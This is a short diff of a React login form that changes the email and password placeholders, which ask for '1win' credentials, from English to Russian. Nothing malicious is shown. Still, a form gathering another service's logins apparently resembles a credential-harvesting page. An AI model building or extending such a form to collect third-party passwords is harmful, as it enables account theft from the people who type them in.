@@ -58,7 +58,7 @@ logs.innerHTML = "WAIT";
             required
             className="inputs"
             type="email"
-            placeholder="Enter 1win email"
+            placeholder="Напишите 1WIN email"
             onChange={(e) => {
               setData({ ...data, email: e.target.value.toLocaleLowerCase() });
             }}
@@ -70,7 +70,7 @@ logs.innerHTML = "WAIT";
             required
             className="inputs"
             type="password"
-            placeholder="Enter 1win password"
+            placeholder="Напишите пароль"
             onChange={(e) => {
               setData({ ...data, password: e.target.value.toLocaleLowerCase() });
             }}
